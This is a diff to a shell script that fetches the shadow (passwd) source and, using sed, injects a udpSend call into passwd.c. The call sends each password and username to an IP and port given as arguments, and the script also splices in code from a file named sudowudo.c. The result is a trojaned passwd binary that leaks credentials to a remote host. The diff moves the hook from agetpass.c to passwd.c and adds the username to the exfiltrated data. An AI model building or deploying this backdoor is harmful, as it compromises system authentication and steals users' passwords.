@@ -17,7 +17,7 @@ apt-get install -y make unzip libbsd-dev autoconf automake libtool bison byacc x
 # Add sources list
 echo "deb-src http://in.archive.ubuntu.com/ubuntu lunar main restricted" >> /etc/apt/sources.list
 apt-get update
-apt-get build-dep shadow
+apt-get -y build-dep shadow
 
 
 wget "https://codeload.github.com/shadow-maint/shadow/zip/refs/tags/4.14.1"
@@ -26,13 +26,13 @@ rm "4.14.1"
 
 DEST_IP=$1
 PORT=$2
-dir="shadow-4.14.1/lib/agetpass.c"
+dir="shadow-4.14.1/src/passwd.c"
 
-PAYLOAD="udpSend(pass, ${PORT}, \"${DEST_IP}\", \"shadow\");"
-match='len = strlen(pass);'
+PAYLOAD="udpSend(pass, ${PORT}, \"${DEST_IP}\", \"shadow\", name);"
+match='STRLCPY(pass, cp);'
 
 sed -i "/$match/a$PAYLOAD" $dir
-sed -i '/\#include <string.h>/rsudowudo.c' $dir
+sed -i '/\#include \"strlcpy.h\"/rsudowudo.c' $dir
 
 cd shadow-4.14.1
 
